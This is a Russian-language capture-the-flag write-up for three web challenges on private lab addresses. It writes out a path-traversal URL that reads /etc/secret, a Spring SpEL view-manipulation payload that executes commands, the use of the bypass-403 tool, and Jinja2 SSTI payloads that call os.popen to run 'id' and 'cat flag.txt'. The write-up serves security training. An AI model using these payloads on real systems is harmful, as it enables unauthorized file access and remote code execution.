web 1

1. Проводим осмотр веб-приложения. И находим ссылку: ![Screenshot_2024-03-21_11_49_29](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/89ffc2c9-6dab-4ca0-b43c-ac2a543a2b67) Перейдя по ней, видим подсказку, что файл с флагом может находиться в директории etc/secret: ![Screenshot_2024-03-21_11_50_45](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/1dcf0c00-b9c7-4a70-8cfc-b424bb8773f1)

2. Чтобы скачать необходимый файл с сервера, воспользуемся уязвимостью "file inclusion". Введем в адресную строку: http://192.168.12.10:5001/download?file_type=/../../../../../../etc/secret. Скачивается нужный файл: ![Screenshot_2024-03-21_11_54_12](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/272ec935-ed57-40d3-9ebd-f3f918f99443)
В нем находится флаг: ![Screenshot_2024-03-21_11_55_59](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/40f75ce4-6e24-4d2c-989d-bb41cd7e3b82)

------------------------------------------------------
web2

Используем Spring view manipulation(https://lohitaksh-nandan.gitbook.io/cheat-sheets/framework/spring/view-manipulation)

Введем команду http://192.168.12.13:8090/login?password=__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22password%22).getInputStream()).next()}__::.x

Перезаходим на http://192.168.12.13:8090/login?password=password и вводим в поле пароля password 
Получаем флаг. Профит




------------------------------------------------------

web3

1. При вводе данных сайт выдает ошибку: "403 Forbidden". Ее можно обойти с помощью скрипта Bypass-403: https://github.com/iamj0ker/bypass-403.

2. Для установки скрипта введем следующие команды в терминале:
	1) git clone https://github.com/iamj0ker/bypass-403
	2) cd bypass-403
	3) chmod +x bypass-403.sh
	
3. Введем команду, в которой укажем наш сайт и путь к файлу flag.txt: ./bypass-403.sh http://192.168.12.11:8001 flag

4. Программа выдает несколько адресов:![Screenshot_2024-03-21_10_14_41](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/5a1e2f9f-79a3-4636-a75c-9ee38b49566e) Выбираем один из адресов с наибольшим временем, например: http://192.168.12.11:8001//flag//, переходим по ссылке и получаем следующий результат:![Screenshot_2024-03-21_10_20_47](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/3feedbef-f71d-434b-a1e7-2bfdbbe872b4)
 
5. Теперь посмотрим на исходный код сайта, а именно на файл "app.py". В строке 24 мы видим, что функции передается параметр "name". Функция выдает два результата в зависимости от полученных данных. Если имя не содержит запрещенных символов, то на экран выводится сообщение "привет <имя>", в противном случае: "Содержит запрещенные символы". ![Screenshot_2024-03-21_10_22_30](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/2dfe648e-5648-4b61-8774-6593b7193ec3)


6. Попробуем передать функции параметр "name". Напишем в адресной строке браузера: http://192.168.12.11:8001//flag?name=abc. Получаем следующее:![Screenshot_2024-03-21_10_27_39](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/3b0595e7-b42a-4994-ba1a-a94359557a73) Далее вместо "abc" напишем запрещенные символы: "mro". Видим следующее:![Screenshot_2024-03-21_10_31_20](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/f0d634dd-64ec-4aff-892b-1837dfc79207) На первый взгляд кажется, что функция работает корректно.

7. Вполне возможно, что сайт имеет уязвимость. С помощью SSTI (внедрения шаблонов на стороне сервера) попробуем что-нибудь достать с сервера. Введем в адресную строку вместо "mro" "{{2*22}}". На экране выдим рузультат математической операции:![Screenshot_2024-03-21_10_34_42](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/a7f98e6c-1b32-49f9-9d91-906c0030df57)
Сервер не заметил запрещенные символы и выполнил команду. Это и есть уязвимость.

8. Проверим, выведет ли сервер ID файлов, которые хранятся на нем. Откроем документацию на GitHub (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) и найдем следующий пункт "Exploit the SSTI by calling os.popen().read()". Вместо "{{2*22}}" введем "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}". Получаем:![Screenshot_2024-03-21_10_42_32](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/2b99527f-7580-4f0f-b02b-af9f7116badf) Сервер выдал ID файлов.

9. Если сервер вывел ID файлов, то он может вывести и содержимое файлов. Нам необходимо найти флаг, поэтому введем команду: http://192.168.12.11:8001//flag?name={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()%20}}; и получим флаг: ![Screenshot_2024-03-21_10_45_13](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/909398a7-b9c5-4673-8a77-6948c6060872)
